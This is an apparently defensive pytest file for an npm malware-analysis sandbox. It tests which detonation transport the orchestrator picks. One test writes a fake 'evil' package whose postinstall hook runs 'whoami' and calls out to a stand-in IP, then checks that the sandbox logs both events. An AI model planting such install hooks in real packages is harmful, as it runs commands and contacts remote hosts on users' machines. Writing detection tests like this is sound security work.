import json

import pytest

from npm_ide_analyst.models import ArtifactType
from npm_ide_analyst.sandbox import orchestrator as orch


def _spy(calls):
    return (lambda key: (lambda *a, **k: calls.setdefault(key, True) or []))


def test_stream_transport_selected_when_docker_host_set(monkeypatch, tmp_path):
    monkeypatch.setenv("DOCKER_HOST", "ssh://user@linux-box")
    calls = {}
    monkeypatch.setattr(orch, "_detonate_via_stream", _spy(calls)("stream"))
    monkeypatch.setattr(orch, "_detonate_isolated", _spy(calls)("isolated"))
    orch.detonate(tmp_path, ArtifactType.NPM, assume_docker=True)
    assert calls == {"stream": True}


def test_bind_transport_when_local(monkeypatch, tmp_path):
    monkeypatch.delenv("DOCKER_HOST", raising=False)
    calls = {}
    monkeypatch.setattr(orch, "_detonate_via_stream", _spy(calls)("stream"))
    monkeypatch.setattr(orch, "_detonate_isolated", _spy(calls)("isolated"))
    orch.detonate(tmp_path, ArtifactType.NPM, assume_docker=True)
    assert calls == {"isolated": True}


def test_remote_flag_forces_stream(monkeypatch, tmp_path):
    monkeypatch.delenv("DOCKER_HOST", raising=False)
    calls = {}
    monkeypatch.setattr(orch, "_detonate_via_stream", _spy(calls)("stream"))
    monkeypatch.setattr(orch, "_detonate_isolated", _spy(calls)("isolated"))
    orch.detonate(tmp_path, ArtifactType.NPM, assume_docker=True, remote=True)
    assert calls == {"stream": True}


def test_sinkhole_over_remote_falls_back_to_stream(monkeypatch, tmp_path):
    monkeypatch.setenv("DOCKER_HOST", "ssh://user@linux-box")
    calls = {}
    monkeypatch.setattr(orch, "_detonate_via_stream", _spy(calls)("stream"))
    monkeypatch.setattr(orch, "_detonate_with_sinkhole", _spy(calls)("sinkhole"))
    orch.detonate(tmp_path, ArtifactType.NPM, assume_docker=True, sinkhole=True)
    assert calls == {"stream": True}          # sinkhole not attempted on remote


@pytest.mark.skipif(not orch.docker_available(), reason="docker not available")
def test_stream_transport_detonates_against_local_daemon(tmp_path):
    # Validate the mount-free stream transport end to end against the LOCAL daemon
    # (a stand-in for remote: tar-on-stdin / events-on-stdout behave identically).
    orch.build_image(assume_docker=True)
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "package.json").write_text(json.dumps(
        {"name": "evil", "scripts": {"postinstall": "node ./s.js"}}))
    (pkg / "s.js").write_text(
        "require('child_process').exec('whoami');"
        "require('http').get('http://198.51.100.9/x');", encoding="utf-8")
    events = orch.detonate(pkg, ArtifactType.NPM, assume_docker=True, remote=True)
    assert any(e.kind == "process" and "whoami" in e.detail for e in events)
    assert any(e.kind == "network" and "198.51.100.9" in e.detail for e in events)
